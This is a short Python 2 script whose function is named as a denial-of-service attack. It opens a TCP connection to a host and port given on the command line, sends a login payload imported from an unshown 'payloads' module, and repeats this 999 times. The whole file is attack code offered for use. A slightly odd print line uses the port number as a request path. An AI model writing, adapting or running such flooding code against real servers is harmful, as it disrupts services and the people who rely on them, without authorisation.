import socket, sys, json, os
from payloads import *


def dos_attack():
    # pid = os.fork()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    address = (sys.argv[1], int(sys.argv[2]))
    s.connect(address)
    print ">> GET /" + sys.argv[2] + " HTTP/1.1"
    s.send(MY_SERVER_LOGIN)
    s.close()


if __name__ == '__main__':
    for i in range(1, 1000):
        dos_attack()
